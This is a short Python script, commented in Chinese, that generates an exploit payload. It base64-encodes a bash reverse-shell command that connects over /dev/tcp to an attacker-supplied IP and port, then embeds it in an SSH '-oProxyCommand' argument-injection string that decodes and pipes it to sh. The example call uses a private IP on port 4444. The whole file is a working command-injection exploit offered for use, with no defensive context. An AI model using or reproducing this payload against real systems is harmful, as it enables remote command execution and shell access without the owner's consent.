import base64
import urllib.parse

def custom_payload(ip, port):
    # 1. 构造 shell 命令写入 /tmp/123
    cmd = f'echo "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1" > /tmp/123'

    # 2. Base64 编码
    cmd_b64 = base64.b64encode(cmd.encode()).decode()

    # 3. 手动替换 base64 中的 "+" 为 "%2b"
    cmd_b64_safe = cmd_b64.replace("+", "%2b")

    # 4. 构造 payload 字符串（保留 |、tab 表示 %09，不编码它们）
    payload = f'x+-oProxyCommand%3decho%09{cmd_b64_safe}|base64%09-d|sh}}'

    return payload

# 示例调用
ip = "192.168.93.130"
port = 4444

final_payload = custom_payload(ip, port)
print("[+] 最终利用 payload：\n")
print(final_payload)
